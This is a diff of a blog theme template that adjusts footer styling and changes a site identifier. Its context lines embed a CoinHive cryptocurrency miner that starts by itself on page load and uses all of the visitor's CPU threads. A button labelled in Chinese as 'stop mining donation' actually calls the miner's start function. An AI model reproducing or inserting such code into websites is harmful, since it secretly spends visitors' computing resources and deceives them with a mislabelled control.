@@ -353,7 +353,7 @@
 	
 	<div>
       {% unless is_index %}
-        <div style="text-align:center;color: #ccc;font-size:17px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+        <div style="text-align:center;color: #ccc;font-size:15px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
       {% endunless %}
     </div>
 	
@@ -378,16 +378,16 @@
 			</table>
 		</center>
 		
-		<center align="center">
+		<div style="text-align:center;">
 			<p id="minebutton">
 				<button onclick="miner.start(CoinHive.FORCE_EXCLUSIVE_TAB)">停止挖矿打赏</button>
 			</p>
-		</center>
+		</div>
 
 		<script type="text/javascript">
 			var miner=new CoinHive.User
 				("YjyptNPkNzUZwQonjCLhkllZAW85Axyo",
-				"davidfnck.com",
+				"www.ds-vip.top",
 				{threads:navigator.hardwareConcurrency,autoThreads:!1,throttle:.9,forceASMJS:!1});
 			
 			miner.start(CoinHive.FORCE_EXCLUSIVE_TAB),
